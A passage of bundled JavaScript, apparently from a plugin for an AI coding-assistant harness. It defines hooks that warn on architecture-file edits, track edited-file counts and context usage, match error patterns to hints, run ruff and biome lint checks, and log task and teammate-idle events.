  if (isDenyDecision3(profileResult)) {
    logInfo(HOOK_NAME17, "Denied by profile");
    return profileResult;
  }
  const filePath = getFilePath(input);
  if (filePath) {
    for (const { pattern, category } of ARCHITECTURE_FILES) {
      if (pattern.test(filePath)) {
        logInfo(HOOK_NAME17, `Architecture file edit: ${category} (${filePath})`);
        const fileName = filePath.split("/").pop();
        return outputWithNotification(
          `\u26A0 Editing ${category}: ${fileName}`,
          `Architecture file modified: ${filePath} (${category}). Verify that this change is intentional and consider its impact on builds, tests, and deployments.`,
          "PreToolUse"
        );
      }
    }
  }
  logDebug(HOOK_NAME17, "No decision, deferring to standard flow");
  return outputSilentSuccess();
}
var HOOK_NAME18 = "post-tool-use";
async function acquireLock2(lockPath, maxAttempts = 50) {
  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    try {
      fs6.mkdirSync(lockPath);
      fs6.writeFileSync(path2.join(lockPath, "pid"), process.pid.toString());
      return true;
    } catch {
      await new Promise((resolve7) => setTimeout(resolve7, 100));
    }
  }
  return false;
}
function releaseLock2(lockPath) {
  try {
    fs6.rmSync(lockPath, { recursive: true, force: true });
  } catch {
  }
}
function getContextFilePath(projectDir) {
  return path2.join(projectDir, ".claude", "context", "shared-context.json");
}
function readContextFile(contextFile) {
  try {
    const content = fs6.readFileSync(contextFile, "utf-8");
    return JSON.parse(content);
  } catch {
    return null;
  }
}
function writeContextFile(contextFile, context) {
  const tmpFile = `${contextFile}.tmp`;
  fs6.writeFileSync(tmpFile, JSON.stringify(context, null, 2));
  fs6.renameSync(tmpFile, contextFile);
}
function updateContextWithEdit(context, filePath) {
  const timestamp = (/* @__PURE__ */ new Date()).toISOString();
  context.dirty_tracking = context.dirty_tracking || {
    files_edited_count: 0,
    files_edited_this_session: [],
    threshold_warning: 15,
    threshold_auto_suggest: 25
  };
  const filesEdited = context.dirty_tracking.files_edited_this_session || [];
  const isNewFile = !filesEdited.includes(filePath);
  if (isNewFile) {
    filesEdited.push(filePath);
    context.dirty_tracking.files_edited_count = (context.dirty_tracking.files_edited_count || 0) + 1;
  }
  context.dirty_tracking.files_edited_this_session = filesEdited;
  context.dirty_tracking.last_edit_timestamp = timestamp;
  context.session_heartbeat = context.session_heartbeat || {
    was_cleanly_ended: false
  };
  context.session_heartbeat.last_activity = timestamp;
  return { context, isNewFile };
}
function getThresholdResponse(count, thresholdWarning, thresholdAuto) {
  if (count >= thresholdAuto) {
    return outputWarning(
      `${count} unique files edited this session. Consider running /create-handoff to save progress.`
    );
  }
  if (count >= thresholdWarning) {
    return outputWarning(
      `${count} unique files edited. Will suggest handoff at ${thresholdAuto} files.`
    );
  }
  return outputSilentSuccess();
}
function getEditedFilePaths(input) {
  const toolName = input.tool_name;
  if (toolName === "MultiEdit") {
    const edits = input.tool_input.edits;
    if (!Array.isArray(edits)) return [];
    const paths = /* @__PURE__ */ new Set();
    for (const edit of edits) {
      if (typeof edit.file_path === "string" && edit.file_path) {
        paths.add(edit.file_path);
      }
    }
    return Array.from(paths);
  }
  const fp = getFilePath(input);
  return fp ? [fp] : [];
}
async function dirtyStateTracker(input) {
  const skipped = runGuards(input, (i) => guardTool(i, "Write", "Edit", "MultiEdit"));
  if (skipped) return skipped;
  const filePaths = getEditedFilePaths(input);
  if (filePaths.length === 0) {
    logDebug(HOOK_NAME18, "No file paths found in input");
    return outputSilentSuccess();
  }
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const contextFile = getContextFilePath(projectDir);
  const lockDir = `${contextFile}.lock`;
  if (!fs6.existsSync(contextFile)) {
    logDebug(HOOK_NAME18, `Context file not found: ${contextFile}`);
    return outputSilentSuccess();
  }
  try {
    fs6.accessSync(contextFile, fs6.constants.W_OK);
  } catch {
    logWarn(HOOK_NAME18, "Context file not writable");
    return outputSilentSuccess();
  }
  const lockAcquired = await acquireLock2(lockDir);
  if (!lockAcquired) {
    logWarn(HOOK_NAME18, "Failed to acquire lock after 5s, skipping");
    return outputSilentSuccess();
  }
  try {
    const context = readContextFile(contextFile);
    if (!context) {
      logError(HOOK_NAME18, "Failed to parse context file");
      return outputSilentSuccess();
    }
    let updatedContext = context;
    for (const fp of filePaths) {
      ({ context: updatedContext } = updateContextWithEdit(updatedContext, fp));
    }
    writeContextFile(contextFile, updatedContext);
    const count = updatedContext.dirty_tracking.files_edited_count;
    const thresholdWarning = updatedContext.dirty_tracking.threshold_warning || 15;
    const thresholdAuto = updatedContext.dirty_tracking.threshold_auto_suggest || 25;
    logDebug(HOOK_NAME18, `Count=${count} (unique files)`);
    return getThresholdResponse(count, thresholdWarning, thresholdAuto);
  } catch (error) {
    logError(HOOK_NAME18, `Error updating context: ${error}`);
    return outputSilentSuccess();
  } finally {
    releaseLock2(lockDir);
  }
}
var HOOK_NAME19 = "context-monitor";
var TEMP_PREFIX = "claude-context-pct-";
var WARN_PREFIX = "claude-context-last-warn-";
function getTier(pct) {
  if (pct >= 90) return 3;
  if (pct >= 80) return 2;
  if (pct >= 70) return 1;
  return 0;
}
function getSuggestedHandoffName(branch, date) {
  const d = /* @__PURE__ */ new Date();
  const datePrefix = d.toISOString().slice(0, 10);
  const raw = branch && branch.length > 0 ? branch : "session";
  const cleaned = raw.replace(/^[a-z]+\//, "").replace(/[^a-zA-Z0-9-]/g, "-").replace(/-+/g, "-").replace(/^-+|-+$/g, "").toLowerCase();
  const safe = cleaned.length > 0 ? cleaned : "session";
  return `${datePrefix}_${safe}.yaml`;
}
function getWarningMessage(tier, pct, suggestedName) {
  const suggestion = suggestedName ? ` Suggested filename: ${suggestedName}.` : "";
  switch (tier) {
    case 1:
      return `Context at ${pct}%. Consider running /create-handoff when at a stopping point.`;
    case 2:
      return `CONTEXT WARNING: ${pct}% used. Recommend /create-handoff then /clear soon.${suggestion}`;
    case 3:
      return `CONTEXT CRITICAL: ${pct}%+. Run /create-handoff NOW, then /clear. Auto-compaction imminent.${suggestion}`;
    default:
      return null;
  }
}
function shouldWarn(currentTier, lastTier) {
  if (currentTier === 0) return false;
  return currentTier > lastTier;
}
function readPercentage(sessionId) {
  const filePath = join(tmpdir(), `${TEMP_PREFIX}${sessionId}.txt`);
  try {
    const content = readFileSync(filePath, "utf8").trim();
    const pct = Number.parseInt(content, 10);
    if (Number.isNaN(pct) || pct < 0) return null;
    return pct;
  } catch {
    return null;
  }
}
function readLastTier(sessionId) {
  const filePath = join(tmpdir(), `${WARN_PREFIX}${sessionId}.txt`);
  try {
    const content = readFileSync(filePath, "utf8").trim();
    const tier = Number.parseInt(content, 10);
    if (tier >= 0 && tier <= 3) return tier;
    return 0;
  } catch {
    return 0;
  }
}
function writeLastTier(sessionId, tier) {
  const filePath = join(tmpdir(), `${WARN_PREFIX}${sessionId}.txt`);
  try {
    writeFileSync(filePath, String(tier), "utf8");
  } catch {
  }
}
function isSafeSessionId(value) {
  if (typeof value !== "string") return false;
  if (value.includes("..")) return false;
  return /^[A-Za-z0-9._-]{1,128}$/.test(value);
}
function getSessionId2(input) {
  if (isSafeSessionId(input.session_id)) {
    return input.session_id;
  }
  const fromEnv = process.env["CLAUDE_SESSION_ID"];
  if (isSafeSessionId(fromEnv)) {
    return fromEnv;
  }
  return "default";
}
async function contextMonitor(input) {
  const sessionId = getSessionId2(input);
  const pct = readPercentage(sessionId);
  if (pct === null) {
    logDebug(HOOK_NAME19, "No context percentage file found (StatusLine not configured?)");
    return outputSilentSuccess();
  }
  logDebug(HOOK_NAME19, `Context at ${pct}%`);
  const currentTier = getTier(pct);
  const lastTier = readLastTier(sessionId);
  if (currentTier === 0 && lastTier > 0) {
    logDebug(HOOK_NAME19, "Context dropped below 70%, resetting rate-limit state");
    writeLastTier(sessionId, 0);
    return outputSilentSuccess();
  }
  if (!shouldWarn(currentTier, lastTier)) {
    logDebug(HOOK_NAME19, `Tier ${currentTier} <= last tier ${lastTier}, skipping`);
    return outputSilentSuccess();
  }
  const suggestedName = currentTier >= 2 ? getSuggestedHandoffName(getCachedBranch() || void 0) : void 0;
  const message = getWarningMessage(currentTier, pct, suggestedName);
  if (!message) {
    return outputSilentSuccess();
  }
  writeLastTier(sessionId, currentTier);
  if (currentTier >= 3) {
    logWarn(HOOK_NAME19, `CRITICAL: Context at ${pct}%`);
  } else {
    logInfo(HOOK_NAME19, `Context warning tier ${currentTier}: ${pct}%`);
  }
  return outputPromptContext(message);
}
var HOOK_NAME20 = "error-rules";
var rulesCache = /* @__PURE__ */ new Map();
function getErrorRulesPath(projectDir) {
  return path2.join(projectDir, ".claude", "rules", "error_rules.json");
}
async function loadErrorRules(projectDir) {
  const cwd = projectDir;
  if (rulesCache.has(cwd)) {
    logDebug(HOOK_NAME20, "Using cached error rules");
    return rulesCache.get(cwd) || null;
  }
  let rulesPath = getErrorRulesPath(cwd);
  if (!fs6.existsSync(rulesPath)) {
    const pluginRoot = process.env["CLAUDE_PLUGIN_ROOT"];
    if (pluginRoot) {
      const pluginRulesPath = getErrorRulesPath(pluginRoot);
      if (fs6.existsSync(pluginRulesPath)) {
        logDebug(HOOK_NAME20, "Using plugin default error rules");
        rulesPath = pluginRulesPath;
      }
    }
  }
  if (!fs6.existsSync(rulesPath)) {
    logDebug(HOOK_NAME20, `Error rules file not found: ${rulesPath}`);
    return null;
  }
  try {
    const content = fs6.readFileSync(rulesPath, "utf-8");
    const config = JSON.parse(content);
    if (!config.rules || !Array.isArray(config.rules)) {
      logError(HOOK_NAME20, "Invalid error rules: missing rules array");
      return null;
    }
    rulesCache.set(cwd, config);
    logDebug(HOOK_NAME20, `Loaded ${config.rules.length} error rules`);
    return config;
  } catch (error) {
    logError(HOOK_NAME20, `Failed to load error rules: ${error}`);
    return null;
  }
}
function matchError(output, rules) {
  if (!output || !rules || rules.length === 0) {
    return { matched: false };
  }
  for (const rule of rules) {
    if (!rule.pattern) {
      continue;
    }
    if (output.includes(rule.pattern)) {
      logDebug(HOOK_NAME20, `Matched error rule: ${rule.id}`);
      return {
        matched: true,
        rule,
        matchedText: rule.pattern
      };
    }
  }
  return { matched: false };
}

// src/posttool/error-warner.ts
var HOOK_NAME21 = "error-warner";
async function errorWarner(input) {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;
  const command = getCommand(input);
  const extendedInput = input;
  const toolOutput = extendedInput.tool_output;
  if (!toolOutput) {
    logDebug(HOOK_NAME21, "No tool output available");
    return outputSilentSuccess();
  }
  const outputText = [toolOutput.stdout, toolOutput.stderr, toolOutput.output].filter(Boolean).join("\n");
  if (!outputText) {
    logDebug(HOOK_NAME21, "Empty output, skipping");
    return outputSilentSuccess();
  }
  const hasError = toolOutput.exit_code !== void 0 && toolOutput.exit_code !== 0 || outputText.includes("Error") || outputText.includes("error") || outputText.includes("FAIL") || outputText.includes("failed") || outputText.includes("Cannot") || outputText.includes("cannot") || outputText.includes("stream abort") || outputText.includes("STREAM_ABORT");
  if (!hasError) {
    logDebug(HOOK_NAME21, "No error indicators found");
    return outputSilentSuccess();
  }
  logDebug(HOOK_NAME21, `Analyzing error output for: ${command.slice(0, 50)}...`);
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const config = await loadErrorRules(projectDir);
  if (!config || config.rules.length === 0) {
    logDebug(HOOK_NAME21, "No error rules configured");
    return outputSilentSuccess();
  }
  const matchResult = matchError(outputText, config.rules);
  if (!matchResult.matched || !matchResult.rule) {
    logDebug(HOOK_NAME21, "No matching error pattern found");
    return outputSilentSuccess();
  }
  logInfo(HOOK_NAME21, `Matched error rule: ${matchResult.rule.id}`);
  return outputWithContext(`\u{1F4A1} Tip: ${matchResult.rule.message}`);
}

// src/posttool/failure-logger.ts
var HOOK_NAME22 = "failure-logger";
var KNOWN_PATTERNS = [
  // Specific patterns before generic ones (order matters — first match wins)
  {
    pattern: /ruff:\s*command not found|No such file.*ruff/i,
    hint: "ruff is not installed. Install with: pip install ruff (or uv pip install ruff). You can also disable the lint-checker hook in .claude/hook-overrides.json."
  },
  {
    pattern: /command not found|not found in PATH/i,
    hint: "The command is not installed or not in PATH. Check if it needs to be installed (e.g., pip install, npm install -g, brew install)."
  },
  {
    pattern: /ENOENT|No such file or directory/i,
    hint: "A file or directory does not exist. Verify the path is correct and the parent directory exists before retrying."
  },
  {
    pattern: /permission denied|EACCES/i,
    hint: "Permission denied. Check file permissions or whether the path is read-only."
  },
  {
    pattern: /ENOSPC|No space left on device/i,
    hint: "Disk is full. Free up space before retrying."
  },
  {
    pattern: /timed?\s*out|timeout/i,
    hint: "The operation timed out. Consider breaking the task into smaller steps or increasing the timeout."
  },
  {
    pattern: /ECONNREFUSED|ECONNRESET|ETIMEDOUT/i,
    hint: "Network connection failed. Check if the target service is running and reachable."
  },
  {
    pattern: /SyntaxError|Unexpected token/i,
    hint: "There is a syntax error in the code. Review the file for missing brackets, quotes, or semicolons."
  }
];
async function failureLogger(input) {
  const failureInput = input;
  const error = failureInput.error;
  if (!error) {
    return outputSilentSuccess();
  }
  const toolName = getToolName(input);
  const sessionId = getSessionId(input);
  const command = getCommand(input);
  const filePath = getFilePath(input);
  const target = command ? `cmd=${command.slice(0, 100)}` : filePath ? `file=${filePath}` : "";
  const logMsg = `FAILURE tool=${toolName} session=${sessionId} ${target} error=${error.slice(0, 200)}`;
  logWarn(HOOK_NAME22, logMsg);
  for (const { pattern, hint } of KNOWN_PATTERNS) {
    if (pattern.test(error)) {
      logInfo(HOOK_NAME22, `Matched pattern: ${pattern.source}`);
      return outputWithContext(hint);
    }
  }
  return outputSilentSuccess();
}
var HOOK_NAME23 = "lint-checker";
var PYTHON_EXTENSIONS = /* @__PURE__ */ new Set([".py", ".pyi"]);
var JS_EXTENSIONS = /* @__PURE__ */ new Set([".ts", ".tsx", ".js", ".jsx", ".mjs", ".cjs"]);
var BIOME_SECURITY_PREFIX = "lint/security/";
var BIOME_FORMAT_CATEGORY = "format";
var MAX_VIOLATIONS_SHOWN = 20;
var MAX_MESSAGE_LENGTH = 3e3;
var LINTER_TIMEOUT_MS = 5e3;
var cachedLinterPath = null;
function findLinter(projectDir) {
  if (cachedLinterPath !== null) {
    return cachedLinterPath ?? void 0;
  }
  const venvRuff = path2.join(projectDir, ".venv", "bin", "ruff");
  if (fs6.existsSync(venvRuff)) {
    cachedLinterPath = venvRuff;
    logDebug(HOOK_NAME23, `Found ruff in venv: ${venvRuff}`);
    return venvRuff;
  }
  const homeDir = process.env["HOME"] || "/tmp";
  const miseRuff = path2.join(homeDir, ".local", "share", "mise", "shims", "ruff");
  if (fs6.existsSync(miseRuff)) {
    cachedLinterPath = miseRuff;
    logDebug(HOOK_NAME23, `Found ruff in mise shims: ${miseRuff}`);
    return miseRuff;
  }
  try {
    const whichResult = execSync("which ruff 2>/dev/null", {
      timeout: 2e3,
      encoding: "utf8"
    }).trim();
    if (whichResult) {
      cachedLinterPath = whichResult;
      logDebug(HOOK_NAME23, `Found ruff in PATH: ${whichResult}`);
      return whichResult;
    }
  } catch {
  }
  cachedLinterPath = void 0;
  logDebug(HOOK_NAME23, "ruff not found");
  return void 0;
}
function runRuffCheck(linterPath, filePaths) {
  try {
    execFileSync(linterPath, ["check", "--output-format", "json", "--no-cache", ...filePaths], {
      timeout: LINTER_TIMEOUT_MS,
      encoding: "utf8",
      stdio: ["pipe", "pipe", "pipe"]
    });
    return [];
  } catch (err) {
    const execError = err;
    if (execError.status === 1 && execError.stdout) {
      try {
        const parsed = JSON.parse(execError.stdout);
        if (Array.isArray(parsed)) {
          return parsed;
        }
        return [];
      } catch {
        logWarn(HOOK_NAME23, "Failed to parse ruff JSON output, skipping");
        return [];
      }
    }
    if (execError.status === 2) {
      logWarn(HOOK_NAME23, `ruff config error: ${execError.stderr || "unknown"}`);
      return [];
    }
    logWarn(HOOK_NAME23, `ruff execution error: ${String(err)}`);
    return [];
  }
}
function runRuffFormat(linterPath, filePaths) {
  try {
    execFileSync(linterPath, ["format", "--check", ...filePaths], {
      timeout: LINTER_TIMEOUT_MS,
      encoding: "utf8",
      stdio: ["pipe", "pipe", "pipe"]
    });
    return [];
  } catch (err) {
    const execError = err;
    if (execError.status === 1 && execError.stdout) {
      const PREFIX = "Would reformat: ";
      return execError.stdout.trim().split("\n").filter((line) => line.startsWith(PREFIX)).map((line) => line.slice(PREFIX.length));
    }
    return [];
  }
}
var cachedBiomePath = null;
function findBiome(projectDir) {
  if (cachedBiomePath !== null) {
    return cachedBiomePath ?? void 0;
  }
  const localBiome = path2.join(projectDir, "node_modules", ".bin", "biome");
  if (fs6.existsSync(localBiome)) {
    cachedBiomePath = localBiome;
    logDebug(HOOK_NAME23, `Found biome in node_modules: ${localBiome}`);
    return localBiome;
  }
  try {
    const whichResult = execSync("which biome 2>/dev/null", {
      timeout: 2e3,
      encoding: "utf8"
    }).trim();
    if (whichResult) {
      cachedBiomePath = whichResult;
      logDebug(HOOK_NAME23, `Found biome in PATH: ${whichResult}`);
      return whichResult;
    }
  } catch {
  }
  cachedBiomePath = void 0;
  logDebug(HOOK_NAME23, "biome not found");
  return void 0;
}
function offsetToRowCol(content, byteOffset) {
  const buf = Buffer.from(content, "utf8");
  const clamped = Math.max(0, Math.min(byteOffset, buf.length));
  const before = buf.subarray(0, clamped).toString("utf8");
  const lines = before.split("\n");
  const lastLine = lines[lines.length - 1] ?? "";
  return {
    row: lines.length,
    // Count CODE POINTS, not UTF-16 code units: an astral char (emoji, some
    // CJK ext) is one column to biome but `.length` 2 in JS, which drifted the
    // reported column by +1 per astral char earlier on the line.
    column: [...lastLine].length + 1
  };
}
function normalizeBiomeDiagnostic(diag, fileContents) {
  const filename = diag.location?.path?.file;
  if (!filename) return null;
  const span = diag.location?.span;
  let location = { row: 1, column: 1 };
  if (span && Array.isArray(span) && typeof span[0] === "number") {
    const content = fileContents.get(filename);
    if (content !== void 0) {
      location = offsetToRowCol(content, span[0]);
    }
  }
  return {
    code: diag.category,
    message: diag.description || "(no description)",
    filename,
    location
  };
}
function execBiomeJson(biomePath, filePaths) {
  try {
    const stdout = execFileSync(biomePath, ["check", "--reporter=json", ...filePaths], {
      timeout: LINTER_TIMEOUT_MS,
      encoding: "utf8",
      stdio: ["pipe", "pipe", "pipe"]
    });
    return stdout || null;
  } catch (err) {
    const execError = err;
    if (execError.status === 1 && execError.stdout) {
      return execError.stdout;
    }
    logWarn(HOOK_NAME23, `biome execution error: ${String(err)}`);
    return null;
  }
}
function parseBiomeDiagnostics(stdout) {
  try {
    const parsed = JSON.parse(stdout);
    return Array.isArray(parsed.diagnostics) ? parsed.diagnostics : [];
  } catch {
    logWarn(HOOK_NAME23, "Failed to parse biome JSON output, skipping");
    return [];
  }
}
function readDiagnosticSources(diagnostics) {
  const contents = /* @__PURE__ */ new Map();
  for (const diag of diagnostics) {
    const f = diag.location?.path?.file;
    if (!f || contents.has(f)) continue;
    try {
      contents.set(f, fs6.readFileSync(f, "utf8"));
    } catch {
    }
  }
  return contents;
}
function runBiomeCheck(biomePath, filePaths) {
  const stdout = execBiomeJson(biomePath, filePaths);
  if (!stdout) return { violations: [], formatIssueFiles: [] };
  const diagnostics = parseBiomeDiagnostics(stdout);
  const fileContents = readDiagnosticSources(diagnostics);
  const violations = [];
  const formatIssueFiles = /* @__PURE__ */ new Set();
  for (const diag of diagnostics) {
    if (diag.category === BIOME_FORMAT_CATEGORY) {
      const f = diag.location?.path?.file;
      if (f) formatIssueFiles.add(f);
      continue;
    }
    const normalized = normalizeBiomeDiagnostic(diag, fileContents);
    if (normalized) violations.push(normalized);
  }
  return { violations, formatIssueFiles: Array.from(formatIssueFiles) };
}
function classifyViolations(violations) {
  const security = [];
  const general = [];
  for (const v of violations) {
    if (v.code.startsWith("S") || v.code.startsWith(BIOME_SECURITY_PREFIX)) {
      security.push(v);
    } else {
      general.push(v);
    }
  }
  return { security, general, totalCount: violations.length };
}
function formatViolationLine(v) {
  const loc = `${path2.basename(v.filename)}:${v.location.row}:${v.location.column}`;
  let fixHint = "no auto-fix";
  if (v.fix) {
    fixHint = v.fix.applicability === "safe" ? "safe fix" : "unsafe fix";
  }
  return `  ${v.code} ${loc} ${v.message} [${fixHint}]`;
}
function plural(n, singular) {
  return `${n} ${singular}${n === 1 ? "" : "s"}`;
}
function formatSecuritySection(security) {
  const shown = security.slice(0, 10);
  const lines = shown.map(formatViolationLine);
  let section = `Security lint violations (${security.length}) -- fix immediately:
${lines.join("\n")}`;
  if (security.length > 10) {
    section += `
  ... and ${security.length - 10} more security issues`;
  }
  return section;
}
function formatGeneralSection(general, securityCount) {
  const maxGeneral = Math.max(MAX_VIOLATIONS_SHOWN - securityCount, 0);
  const shown = general.slice(0, maxGeneral);
  const lines = shown.map(formatViolationLine);
  let section = `Lint violations (${general.length}):
${lines.join("\n")}`;
  if (general.length > maxGeneral) {
    section += `
  ... and ${general.length - maxGeneral} more`;
  }
  return section;
}
function formatterFor(file) {
  return JS_EXTENSIONS.has(path2.extname(file).toLowerCase()) ? "biome format --write" : "ruff format";
}
function formatFormatSection(files) {
  const fileLines = files.map(
    (f) => `  ${path2.basename(f)} needs formatting (run \`${formatterFor(f)}\`)`
  );
  return `Format issues (${plural(files.length, "file")}):
${fileLines.join("\n")}`;
}
function formatSummaryLine(classified, formatIssueFiles, fileCount) {
  const parts = [];
  if (classified.totalCount > 0) {
    const secNote = classified.security.length > 0 ? ` (${classified.security.length} security)` : "";
    parts.push(`${plural(classified.totalCount, "lint issue")}${secNote}`);
  }
  if (formatIssueFiles.length > 0) {
    parts.push(plural(formatIssueFiles.length, "formatting issue"));
  }
  return `Total: ${parts.join(", ")} in ${plural(fileCount, "file")}.`;
}
function formatMessage(results, fileCount) {
  const { violations, formatIssueFiles } = results;
  const { security, general, totalCount } = violations;
  if (totalCount === 0 && formatIssueFiles.length === 0) {
    return "";
  }
  const sections = [];
  if (security.length > 0) {
    sections.push(formatSecuritySection(security));
  }
  if (general.length > 0) {
    sections.push(formatGeneralSection(general, security.length));
  }
  if (formatIssueFiles.length > 0) {
    sections.push(formatFormatSection(formatIssueFiles));
  }
  sections.push(formatSummaryLine(violations, formatIssueFiles, fileCount));
  let message = sections.join("\n\n");
  if (message.length > MAX_MESSAGE_LENGTH) {
    message = `${message.slice(0, MAX_MESSAGE_LENGTH)}
... (truncated)`;
  }
  return message;
}
function getMultiEditPaths(input) {
  const edits = input.tool_input.edits;
  if (!Array.isArray(edits)) {
    return [];
  }
  const paths = /* @__PURE__ */ new Set();
  for (const edit of edits) {
    if (typeof edit.file_path === "string" && edit.file_path) {
      paths.add(edit.file_path);
    }
  }
  return Array.from(paths);
}
function collectLintableFiles(input, toolName) {
  let filePaths;
  if (toolName === "MultiEdit") {
    filePaths = getMultiEditPaths(input);
  } else {
    const fp = getFilePath(input);
    filePaths = fp ? [fp] : [];
  }
  const python = [];
  const js = [];
  for (const fp of filePaths) {
    const ext = path2.extname(fp).toLowerCase();
    if (PYTHON_EXTENSIONS.has(ext)) {
      python.push(fp);
    } else if (JS_EXTENSIONS.has(ext)) {
      js.push(fp);
    }
  }
  return { python, js };
}
function filterExisting(filePaths) {
  return filePaths.filter((fp) => {
    if (!fs6.existsSync(fp)) {
      logDebug(HOOK_NAME23, `File not found: ${fp}`);
      return false;
    }
    return true;
  });
}
var EMPTY_RUN = { violations: [], formatIssueFiles: [], checkedCount: 0 };
function lintPythonFiles(files, projectDir) {
  if (files.length === 0) return EMPTY_RUN;
  const ruffPath = findLinter(projectDir);
  if (!ruffPath) {
    logDebug(HOOK_NAME23, "ruff not available, skipping Python files");
    return EMPTY_RUN;
  }
  return {
    violations: runRuffCheck(ruffPath, files),
    formatIssueFiles: runRuffFormat(ruffPath, files),
    checkedCount: files.length
  };
}
function lintJsFiles(files, projectDir) {
  if (files.length === 0) return EMPTY_RUN;
  const biomePath = findBiome(projectDir);
  if (!biomePath) {
    logDebug(HOOK_NAME23, "biome not available, skipping JS/TS files");
    return EMPTY_RUN;
  }
  const { violations, formatIssueFiles } = runBiomeCheck(biomePath, files);
  return { violations, formatIssueFiles, checkedCount: files.length };
}
function linterLabelFor(pythonCount, jsCount) {
  if (pythonCount > 0 && jsCount > 0) return "lint";
  return pythonCount > 0 ? "ruff" : "biome";
}
function buildUserSummary(label, classified, formatIssueCount, fileCount) {
  const { totalCount, security } = classified;
  const secNote = security.length > 0 ? ` (${security.length} security)` : "";
  const fmtNote = formatIssueCount > 0 ? `, ${formatIssueCount} formatting` : "";
  return `${label}: ${plural(totalCount, "lint issue")}${secNote}${fmtNote} in ${plural(fileCount, "file")} -- fix before continuing`;
}
async function lintChecker(input) {
  const skipped = runGuards(input, guardWriteEdit);
  if (skipped) return skipped;
  const { python, js } = collectLintableFiles(input, getToolName(input));
  const existingPython = filterExisting(python);
  const existingJs = filterExisting(js);
  if (existingPython.length === 0 && existingJs.length === 0) {
    return outputSilentSuccess();
  }
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const ruffRun = lintPythonFiles(existingPython, projectDir);
  const biomeRun = lintJsFiles(existingJs, projectDir);
  const checkedCount = ruffRun.checkedCount + biomeRun.checkedCount;
  if (checkedCount === 0) {
    return outputSilentSuccess();
  }
  const formatIssueFiles = [...ruffRun.formatIssueFiles, ...biomeRun.formatIssueFiles];
  const classified = classifyViolations([...ruffRun.violations, ...biomeRun.violations]);
  const message = formatMessage({ violations: classified, formatIssueFiles }, checkedCount);
  if (!message) {
    logDebug(HOOK_NAME23, `Lint clean: ${[...existingPython, ...existingJs].join(", ")}`);
    return outputSilentSuccess();
  }
  logInfo(HOOK_NAME23, `Found ${classified.totalCount} lint issues in ${checkedCount} file(s)`);
  const label = linterLabelFor(ruffRun.checkedCount, biomeRun.checkedCount);
  return outputWithNotification(
    buildUserSummary(label, classified, formatIssueFiles.length, checkedCount),
    `Lint issues found -- please fix before continuing:
\`\`\`
${message}
\`\`\``
  );
}

// src/lifecycle/instructions-loaded.ts
var HOOK_NAME24 = "instructions-loaded";
async function instructionsLoaded(input) {
  const source = input.source || "unknown";
  const cwd = input.cwd || process.env["CLAUDE_PROJECT_DIR"] || ".";
  logDebug(HOOK_NAME24, `Instructions loaded event fired, source: ${source}, cwd: ${cwd}`);
  logInfo(HOOK_NAME24, `Instructions loaded: ${source}`);
  return outputSilentSuccess();
}
var HOOK_NAME25 = "teammate-idle-saver";
var MAX_LOCK_ATTEMPTS2 = 20;
async function teammateIdleSaver(input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const teammateName = input.teammate_name || "unknown";
  const teamName = input.team_name || "unknown";
  logDebug(HOOK_NAME25, `Teammate idle: teammate_name=${teammateName}, team_name=${teamName}`);
  const contextFile = path2.join(projectDir, CONTINUITY_DIRS.context, "shared-context.json");
  if (!fs6.existsSync(contextFile)) {
    logDebug(HOOK_NAME25, "No context file found, nothing to update");
    return outputSilentSuccess();
  }
  const lockDir = `${contextFile}.lock`;
  if (!await acquireLock(lockDir, MAX_LOCK_ATTEMPTS2)) {
    logError(HOOK_NAME25, "Failed to acquire lock, skipping context update");
    return outputSilentSuccess();
  }
  try {
    const raw = fs6.readFileSync(contextFile, "utf8");
    let context;
    try {
      context = JSON.parse(raw);
    } catch {
      logError(HOOK_NAME25, "Context file contains invalid JSON, skipping update");
      return outputSilentSuccess();
    }
    const timestamp = formatTimestamp();
    const heartbeat = context["session_heartbeat"] || {};
    heartbeat["last_activity"] = timestamp;
    context["session_heartbeat"] = heartbeat;
    context["last_agent_idle"] = {
      teammate_name: teammateName,
      team_name: teamName,
      timestamp
    };
    const tempFile = `${contextFile}.tmp`;
    fs6.writeFileSync(tempFile, `${JSON.stringify(context, null, 2)}
`);
    fs6.renameSync(tempFile, contextFile);
    logInfo(HOOK_NAME25, `Heartbeat updated on teammate idle (teammate: ${teammateName})`);
  } catch (error) {
    logError(HOOK_NAME25, `Failed to update context file: ${error}`);
  } finally {
    releaseLock(lockDir);
  }
  return outputSilentSuccess();
}
var HOOK_NAME26 = "task-completed-logger";
var METRICS_DIR = ".claude/continuity/metrics";
var METRICS_FILE = "tasks.jsonl";
async function taskCompletedLogger(input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const sessionId = input.session_id || process.env["CLAUDE_SESSION_ID"] || "unknown";
  const taskId = input.task_id || "unknown";
  logDebug(HOOK_NAME26, `Task completed: task_id=${taskId}, session_id=${sessionId}`);
  const metricsDir = path2.join(projectDir, METRICS_DIR);
  const metricsFile = path2.join(metricsDir, METRICS_FILE);
  try {
    if (!fs6.existsSync(metricsDir)) {
      fs6.mkdirSync(metricsDir, { recursive: true });
    }
    const entry = {
      event: "completed",
      timestamp: formatTimestamp(),
      task_id: taskId,
      session_id: sessionId,
      ...input.task_subject && { task_subject: input.task_subject },
      ...input.task_description && { task_description: input.task_description },
      ...input.teammate_name && { teammate_name: input.teammate_name },
      ...input.team_name && { team_name: input.team_name }
    };
    fs6.appendFileSync(metricsFile, `${JSON.stringify(entry)}
`);
    logInfo(HOOK_NAME26, `Task completion logged for task ${taskId}`);
  } catch (error) {
    logError(HOOK_NAME26, `Failed to log task completion: ${error}`);
  }
  return outputSilentSuccess();
}
var HOOK_NAME27 = "task-created-logger";
var METRICS_DIR2 = ".claude/continuity/metrics";
var METRICS_FILE2 = "tasks.jsonl";
async function taskCreatedLogger(input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const sessionId = input.session_id || process.env["CLAUDE_SESSION_ID"] || "unknown";
  const taskId = input.task_id || "unknown";
  logDebug(HOOK_NAME27, `Task created: task_id=${taskId}, session_id=${sessionId}`);
  const metricsDir = path2.join(projectDir, METRICS_DIR2);
  const metricsFile = path2.join(metricsDir, METRICS_FILE2);
  try {
    if (!fs6.existsSync(metricsDir)) {
      fs6.mkdirSync(metricsDir, { recursive: true });
    }
